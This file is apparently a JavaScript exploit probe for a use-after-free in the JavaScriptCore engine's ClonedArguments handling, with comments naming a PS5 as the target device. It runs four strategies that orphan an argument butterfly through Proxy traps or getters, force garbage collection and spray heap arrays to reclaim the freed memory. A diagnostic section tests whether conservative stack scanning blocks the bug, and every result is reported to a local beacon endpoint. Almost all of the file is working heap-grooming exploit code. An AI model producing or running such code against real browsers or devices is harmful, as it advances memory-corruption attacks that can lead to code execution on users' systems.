// p221c — ClonedArguments butterfly UAF: stronger GC pressure + diagnostics
//
// Analysis: copyToArguments (ClonedArguments.cpp:289) caches butterfly data pointer.
// Proxy trap on hole → grow args → old butterfly orphaned → spray to reclaim.
//
// KEY FINDING: Conservative stack scanning (ConservativeRoots.cpp:72-82) likely keeps
// the stale 'data' pointer alive during GC. marksConveyLivenessDuringMarking
// (MarkedBlockInlines.h:73-91) means even full-GC marks from one version back
// are treated as live during conservative scan.
//
// This probe TESTS whether the device actually exhibits this blocking behavior,
// with 4 strategies of increasing aggressiveness:
//   A: Extreme auxiliary pressure (50K same-size-class butterflies)
//   B: Large butterfly (PreciseAllocation path, >7800 bytes)
//   C: Double GC with memory pressure for full collection
//   D: Getter prototype instead of Proxy (different stack layout)
//
// Beacon prefix: V221C-

(function() {
  'use strict';

  function B(tag, body) {
    try {
      navigator.sendBeacon('/beacon/V221C-' + tag + '?t=' + Date.now(), body || '');
    } catch (e) {}
  }

  function BS(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V221C-' + tag + '?t=' + Date.now(), false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  function f64hex(v) {
    try {
      var buf = new ArrayBuffer(8);
      var f = new Float64Array(buf);
      var u = new Uint32Array(buf);
      f[0] = v;
      return hex(u[1]) + '_' + hex(u[0]);
    } catch (e) { return 'ERR'; }
  }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // Utility: report values from a result array
  function reportVals(prefix, result, maxIdx) {
    var n = Math.min(result.length, maxIdx || 64);
    for (var i = 0; i < n; i++) {
      var v = result[i];
      if (typeof v === 'number') {
        var u = v >>> 0;
        var hi = u >>> 16;
        // Only report interesting values (not original sequential 1..N)
        if (v !== (i + 1) && hi !== 0xFACE && hi !== 0xBEEF) {
          BS(prefix + '-' + i + '=' + f64hex(v));
        } else if (hi === 0xC0FE || hi === 0xD0AD || hi === 0xBEAD ||
                   hi === 0xAAAA || hi === 0xBBBB || hi === 0xCCCC) {
          BS(prefix + '-HIT-' + i + '=' + hex(u));
        }
      } else if (typeof v === 'object' && v !== null) {
        BS(prefix + '-OBJ-' + i);
      } else if (typeof v === 'string') {
        BS(prefix + '-STR-' + i + '=' + v.length);
      } else if (v === undefined && i !== 5 && i !== 10 && i !== 15) {
        // Undefined at non-hole positions is interesting
        BS(prefix + '-UND-' + i);
      }
    }
  }

  // Count corrupted values
  function countCorrupt(result, n) {
    var count = 0;
    for (var i = 0; i < Math.min(result.length, n); i++) {
      var v = result[i];
      if (typeof v !== 'number') { count++; continue; }
      if (v !== (i + 1)) {
        var u = v >>> 0;
        var hi = u >>> 16;
        if (hi !== 0xBEEF && hi !== 0xFACE) count++;
      }
    }
    return count;
  }

  // ===========================================================
  // STRATEGY A: Extreme auxiliary pressure
  // Pre-age butterfly, then massive same-size-class spray in trap
  // ===========================================================
  try {
    BS('A-START');

    // Pre-allocate: create many arrays to trigger GC and age the args butterfly
    var argArr = [];
    for (var i = 0; i < 64; i++) argArr.push(i + 1);
    var argsA = target.apply(null, argArr);

    // Age the butterfly: allocate ~40MB to trigger eden GC cycle
    // After GC, butterfly moves from newlyAllocated to old generation
    var ageJunk = [];
    for (var g = 0; g < 100; g++) {
      var batch = [];
      for (var k = 0; k < 5000; k++) {
        batch.push({a: k, b: k + 1});
      }
      ageJunk.push(batch);
    }
    ageJunk.length = 0;
    ageJunk = null;

    // Second wave to force another GC (want butterfly marked in previous cycle)
    var ageJunk2 = [];
    for (var g2 = 0; g2 < 100; g2++) {
      var batch2 = [];
      for (var k2 = 0; k2 < 5000; k2++) {
        batch2.push({c: k2});
      }
      ageJunk2.push(batch2);
    }
    ageJunk2.length = 0;
    ageJunk2 = null;

    // WeakRef sentinel to detect if GC ran
    var sentA = {};
    var wrA = new WeakRef(sentA);
    sentA = null;

    // Setup UAF: create holes at positions 5, 10, 15
    delete argsA[5];
    delete argsA[10];
    delete argsA[15];

    var trapCountA = 0;
    var sprayA = [];
    var gcDetectedA = false;

    var trapA = {
      get: function(tgt, prop, rcv) {
        trapCountA++;
        if (trapCountA > 1) return 0xFACE0000 | (trapCountA & 0xFFFF);

        // Step 1: Grow butterfly to orphan the old one
        for (var j = 100; j < 500; j++) {
          argsA[j] = 0x41414141;
        }

        // Step 2: Massive allocation pressure to trigger GC
        // Allocate ~60MB of objects to exceed eden budget
        var junk = [];
        for (var g = 0; g < 150; g++) {
          var b = [];
          for (var kk = 0; kk < 5000; kk++) {
            b.push({x: kk, y: kk + 1, z: kk + 2});
          }
          junk.push(b);
        }
        junk.length = 0;
        junk = null;

        // Check if GC ran
        gcDetectedA = (wrA.deref() === undefined);

        // Step 3: Spray same-size-class auxiliary allocations (butterfly size = 560 bytes)
        // Array with vector length 69: butterfly = 8 + 69*8 = 560 bytes
        // Also try 68 and 70 for size class neighbors
        for (var s = 0; s < 20000; s++) {
          var arr = new Array(69);
          for (var f = 0; f < 69; f++) {
            arr[f] = (0xAAAA0000 | (s & 0xFFFF)) >>> 0;
          }
          sprayA.push(arr);
        }

        // Additional spray with slightly different sizes
        for (var s2 = 0; s2 < 5000; s2++) {
          var arr2 = new Array(68);
          for (var f2 = 0; f2 < 68; f2++) {
            arr2[f2] = (0xBBBB0000 | (s2 & 0xFFFF)) >>> 0;
          }
          sprayA.push(arr2);
        }

        return 0xBEEF0001;
      }
    };

    Object.setPrototypeOf(argsA, new Proxy({}, trapA));

    var resultA;
    try {
      resultA = receiver.apply(null, argsA);
    } catch (e) {
      BS('A-APPLY-ERR-' + e.message.substring(0, 40));
      resultA = null;
    }

    BS('A-DIAG-traps=' + trapCountA + '-gc=' + gcDetectedA + '-spray=' + sprayA.length);

    if (resultA) {
      var corruptA = countCorrupt(resultA, 64);
      BS('A-LEN=' + resultA.length + '-CORRUPT=' + corruptA);

      // Report values around hole positions (most likely to show corruption)
      var check = [4,5,6,7, 9,10,11,12, 14,15,16,17, 20,30,40,50,60,63];
      for (var ci = 0; ci < check.length; ci++) {
        var idx = check[ci];
        if (idx < resultA.length) {
          var val = resultA[idx];
          BS('A-V' + idx + '=' + f64hex(typeof val === 'number' ? val : 0) + '-T' + typeof val);
        }
      }

      if (corruptA > 0) {
        BS('A-UAF-CONFIRMED');
        reportVals('A-D', resultA, 64);
      } else {
        BS('A-NO-CORRUPT-CONSERVATIVE-ROOT-LIKELY');
      }
    }

    sprayA.length = 0;
    sprayA = null;
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 50));
  }

  // ===========================================================
  // STRATEGY B: Large butterfly (PreciseAllocation path)
  // Use 1200 args → butterfly > 8000 bytes → PreciseAllocation
  // PreciseAllocation uses flip() which clears isMarked
  // ===========================================================
  try {
    BS('B-START');

    var N_ARGS_B = 1200;
    var argArrB = [];
    for (var i = 0; i < N_ARGS_B; i++) argArrB.push(i + 1);
    var argsB = target.apply(null, argArrB);

    // Age the butterfly
    var ageB = [];
    for (var g = 0; g < 80; g++) {
      var b = [];
      for (var k = 0; k < 5000; k++) b.push({a: k});
      ageB.push(b);
    }
    ageB.length = 0;
    ageB = null;

    var sentB = {};
    var wrB = new WeakRef(sentB);
    sentB = null;

    // Create holes in the first 64 elements
    delete argsB[5];
    delete argsB[10];
    delete argsB[15];

    var trapCountB = 0;
    var sprayB = [];
    var gcDetectedB = false;

    // Butterfly size: totalSize(0, 4, true, 1200*8) = 32 + 8 + 9600 = 9640
    // This should be a PreciseAllocation (> largeCutoff ~7800)
    var SPRAY_SIZE_B = 1200; // matching vector length
    // Array butterfly: totalSize(0, 0, true, 1200*8) = 8 + 9600 = 9608

    var trapB = {
      get: function(tgt, prop, rcv) {
        trapCountB++;
        if (trapCountB > 1) return 0xFACE0000 | (trapCountB & 0xFFFF);

        // Grow to orphan
        for (var j = 1300; j < 2000; j++) argsB[j] = 0x42424242;

        // Massive GC pressure
        var junk = [];
        for (var g = 0; g < 200; g++) {
          var b = [];
          for (var kk = 0; kk < 5000; kk++) b.push({x: kk});
          junk.push(b);
        }
        junk.length = 0;
        junk = null;

        gcDetectedB = (wrB.deref() === undefined);

        // Spray matching PreciseAllocation size
        for (var s = 0; s < 2000; s++) {
          var arr = new Array(SPRAY_SIZE_B);
          for (var f = 0; f < Math.min(64, SPRAY_SIZE_B); f++) {
            arr[f] = (0xCCCC0000 | (s & 0xFFFF)) >>> 0;
          }
          // Fill the rest less expensively
          for (var f2 = 64; f2 < SPRAY_SIZE_B; f2++) {
            arr[f2] = 0xDDDD0000;
          }
          sprayB.push(arr);
        }

        return 0xBEEF0002;
      }
    };

    Object.setPrototypeOf(argsB, new Proxy({}, trapB));

    var resultB;
    try {
      resultB = receiver.apply(null, argsB);
    } catch (e) {
      BS('B-APPLY-ERR-' + e.message.substring(0, 40));
      resultB = null;
    }

    BS('B-DIAG-traps=' + trapCountB + '-gc=' + gcDetectedB + '-spray=' + sprayB.length);

    if (resultB) {
      var corruptB = countCorrupt(resultB, 64);
      BS('B-LEN=' + resultB.length + '-CORRUPT=' + corruptB);

      var checkB = [4,5,6,7, 9,10,11,12, 14,15,16,17, 20,30,50];
      for (var ci = 0; ci < checkB.length; ci++) {
        var idx = checkB[ci];
        if (idx < resultB.length) {
          var val = resultB[idx];
          BS('B-V' + idx + '=' + f64hex(typeof val === 'number' ? val : 0) + '-T' + typeof val);
        }
      }

      if (corruptB > 0) {
        BS('B-UAF-CONFIRMED-PRECISE-ALLOC');
        reportVals('B-D', resultB, 64);
      } else {
        BS('B-NO-CORRUPT');
      }
    }

    sprayB.length = 0;
    sprayB = null;
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 50));
  }

  // ===========================================================
  // STRATEGY C: Double GC with extreme memory pressure
  // Try to force a full GC by exceeding critical memory threshold
  // On PS5 with ~500MB usable, allocating ~200MB should push it
  // ===========================================================
  try {
    BS('C-START');

    var argArrC = [];
    for (var i = 0; i < 64; i++) argArrC.push(i + 1);
    var argsC = target.apply(null, argArrC);

    // Age aggressively: several rounds of allocation + release
    for (var round = 0; round < 3; round++) {
      var ageC = [];
      for (var g = 0; g < 60; g++) {
        var b = [];
        for (var k = 0; k < 5000; k++) b.push({a: k});
        ageC.push(b);
      }
      ageC.length = 0;
      ageC = null;
    }

    var sentC = {};
    var wrC = new WeakRef(sentC);
    sentC = null;

    // Setup
    delete argsC[5];

    var trapCountC = 0;
    var sprayC = [];
    var gcCountC = 0;

    var trapC = {
      get: function(tgt, prop, rcv) {
        trapCountC++;
        if (trapCountC > 1) return 0xFACE0000 | (trapCountC & 0xFFFF);

        // Grow to orphan
        for (var j = 100; j < 400; j++) argsC[j] = 0x43434343;

        // DOUBLE GC: allocate → release → allocate → release
        // Goal: exhaust eden multiple times to trigger m_shouldDoFullCollection
        for (var wave = 0; wave < 4; wave++) {
          var junk = [];
          for (var g = 0; g < 80; g++) {
            var b = [];
            for (var kk = 0; kk < 5000; kk++) b.push({x: kk});
            junk.push(b);
          }
          junk.length = 0;
          junk = null;
          gcCountC++;
        }

        // Additional ArrayBuffer pressure (hits bmalloc/libpas, not MarkedSpace)
        var abJunk = [];
        for (var ab = 0; ab < 500; ab++) {
          abJunk.push(new ArrayBuffer(16384)); // 16KB each = 8MB total
        }
        abJunk.length = 0;
        abJunk = null;

        // Now spray same-size-class
        for (var s = 0; s < 30000; s++) {
          var arr = new Array(69);
          for (var f = 0; f < 69; f++) {
            arr[f] = (0xAAAA0000 | (s & 0xFFFF)) >>> 0;
          }
          sprayC.push(arr);
        }

        return 0xBEEF0003;
      }
    };

    Object.setPrototypeOf(argsC, new Proxy({}, trapC));

    var resultC;
    try {
      resultC = receiver.apply(null, argsC);
    } catch (e) {
      BS('C-APPLY-ERR-' + e.message.substring(0, 40));
      resultC = null;
    }

    var gcRanC = (wrC.deref() === undefined);
    BS('C-DIAG-traps=' + trapCountC + '-gc=' + gcRanC + '-waves=' + gcCountC + '-spray=' + sprayC.length);

    if (resultC) {
      var corruptC = countCorrupt(resultC, 64);
      BS('C-LEN=' + resultC.length + '-CORRUPT=' + corruptC);

      // Report key values
      for (var idx = 4; idx <= 7; idx++) {
        if (idx < resultC.length) {
          var val = resultC[idx];
          BS('C-V' + idx + '=' + f64hex(typeof val === 'number' ? val : 0) + '-T' + typeof val);
        }
      }

      if (corruptC > 0) {
        BS('C-UAF-CONFIRMED-DOUBLE-GC');
        reportVals('C-D', resultC, 64);
      } else {
        BS('C-NO-CORRUPT');
      }
    }

    sprayC.length = 0;
    sprayC = null;
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 50));
  }

  // ===========================================================
  // STRATEGY D: Getter prototype instead of Proxy
  // Different JS→C++ call path may result in different register
  // allocation / stack layout, potentially avoiding conservative root
  // ===========================================================
  try {
    BS('D-START');

    var argArrD = [];
    for (var i = 0; i < 64; i++) argArrD.push(i + 1);
    var argsD = target.apply(null, argArrD);

    // Age
    var ageD = [];
    for (var g = 0; g < 80; g++) {
      var b = [];
      for (var k = 0; k < 5000; k++) b.push({a: k});
      ageD.push(b);
    }
    ageD.length = 0;
    ageD = null;

    // Create holes
    delete argsD[5];
    delete argsD[10];
    delete argsD[15];

    var trapCountD = 0;
    var sprayD = [];

    // Build a prototype object with indexed getters instead of Proxy
    var protoD = {};
    var getterBody = function(idx) {
      return function() {
        trapCountD++;
        if (trapCountD > 1) return 0xFACE0000 | (trapCountD & 0xFFFF);

        // Grow to orphan
        for (var j = 100; j < 500; j++) argsD[j] = 0x44444444;

        // GC pressure
        var junk = [];
        for (var g = 0; g < 120; g++) {
          var b = [];
          for (var kk = 0; kk < 5000; kk++) b.push({x: kk});
          junk.push(b);
        }
        junk.length = 0;
        junk = null;

        // Spray
        for (var s = 0; s < 20000; s++) {
          var arr = new Array(69);
          for (var f = 0; f < 69; f++) {
            arr[f] = (0xAAAA0000 | (s & 0xFFFF)) >>> 0;
          }
          sprayD.push(arr);
        }

        return 0xBEEF0004;
      };
    };

    // Define getters for hole indices
    Object.defineProperty(protoD, '5', { get: getterBody(5), configurable: true });
    Object.defineProperty(protoD, '10', { get: getterBody(10), configurable: true });
    Object.defineProperty(protoD, '15', { get: getterBody(15), configurable: true });

    Object.setPrototypeOf(argsD, protoD);

    var resultD;
    try {
      resultD = receiver.apply(null, argsD);
    } catch (e) {
      BS('D-APPLY-ERR-' + e.message.substring(0, 40));
      resultD = null;
    }

    BS('D-DIAG-traps=' + trapCountD + '-spray=' + sprayD.length);

    if (resultD) {
      var corruptD = countCorrupt(resultD, 64);
      BS('D-LEN=' + resultD.length + '-CORRUPT=' + corruptD);

      var checkD = [4,5,6,7, 9,10,11,12, 14,15,16,17];
      for (var ci = 0; ci < checkD.length; ci++) {
        var idx = checkD[ci];
        if (idx < resultD.length) {
          var val = resultD[idx];
          BS('D-V' + idx + '=' + f64hex(typeof val === 'number' ? val : 0) + '-T' + typeof val);
        }
      }

      if (corruptD > 0) {
        BS('D-UAF-CONFIRMED-GETTER');
        reportVals('D-D', resultD, 64);
      } else {
        BS('D-NO-CORRUPT');
      }
    }

    sprayD.length = 0;
    sprayD = null;
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 50));
  }

  // ===========================================================
  // DIAGNOSTIC: Confirm conservative rooting hypothesis
  // Create an args, grow butterfly in trap, check if OLD butterfly
  // memory is EVER freed using FinalizationRegistry on sentinel
  // objects allocated at known times
  // ===========================================================
  try {
    BS('DIAG-START');

    var frCallbacks = [];
    var fr = new FinalizationRegistry(function(held) {
      frCallbacks.push(held);
    });

    // Create sentinel objects at different lifecycle points
    var s1 = {};
    fr.register(s1, 'PRE-ARGS');
    var wr1 = new WeakRef(s1);
    s1 = null;

    var argArrX = [];
    for (var i = 0; i < 64; i++) argArrX.push(i + 1);
    var argsX = target.apply(null, argArrX);

    var s2 = {};
    fr.register(s2, 'POST-ARGS');
    var wr2 = new WeakRef(s2);
    s2 = null;

    delete argsX[5];

    var trapRanDiag = false;
    var trapDiag = {
      get: function(tgt, prop, rcv) {
        if (trapRanDiag) return 0xFACE0000;
        trapRanDiag = true;

        // Grow to orphan
        for (var j = 100; j < 300; j++) argsX[j] = 0x45454545;

        // Create post-orphan sentinel
        var s3 = {};
        fr.register(s3, 'POST-ORPHAN');
        var wr3 = new WeakRef(s3);
        s3 = null;

        // GC pressure
        var junk = [];
        for (var g = 0; g < 150; g++) {
          var b = [];
          for (var kk = 0; kk < 5000; kk++) b.push({z: kk});
          junk.push(b);
        }
        junk.length = 0;
        junk = null;

        // Check sentinels
        var alive1 = wr1.deref() !== undefined;
        var alive2 = wr2.deref() !== undefined;
        var alive3 = wr3.deref() !== undefined;
        BS('DIAG-SENTINEL-pre=' + (alive1 ? 'ALIVE' : 'DEAD') +
           '-post=' + (alive2 ? 'ALIVE' : 'DEAD') +
           '-orphan=' + (alive3 ? 'ALIVE' : 'DEAD'));

        // If pre-args sentinel is dead, GC ran and can collect things
        // If post-args is dead, GC can collect things near the butterfly
        // Key: even if sentinels are dead, butterfly may survive conservative root

        return 0xBEEF0005;
      }
    };

    Object.setPrototypeOf(argsX, new Proxy({}, trapDiag));

    try {
      var resultX = receiver.apply(null, argsX);
    } catch (e) {
      BS('DIAG-APPLY-ERR-' + e.message.substring(0, 40));
    }

    // Report finalization callbacks (may fire later via microtask)
    BS('DIAG-TRAP-RAN=' + trapRanDiag + '-FR-CBACKS=' + frCallbacks.length);

    // Force one more GC cycle and check callbacks
    var postJunk = [];
    for (var g = 0; g < 50; g++) {
      var b = [];
      for (var k = 0; k < 5000; k++) b.push({q: k});
      postJunk.push(b);
    }
    postJunk.length = 0;
    postJunk = null;

    // Give microtask queue a chance to process FinalizationRegistry callbacks
    // Use setTimeout if available, otherwise just report what we have
    try {
      setTimeout(function() {
        BS('DIAG-LATE-FR=' + frCallbacks.join(','));
        BS('DIAG-LATE-WR1=' + (wr1.deref() !== undefined ? 'ALIVE' : 'DEAD'));
        BS('DIAG-LATE-WR2=' + (wr2.deref() !== undefined ? 'ALIVE' : 'DEAD'));
      }, 500);
    } catch (e) {
      BS('DIAG-NO-SETTIMEOUT');
    }

  } catch (e) {
    BS('DIAG-ERR-' + e.message.substring(0, 50));
  }

  BS('DONE');
})();
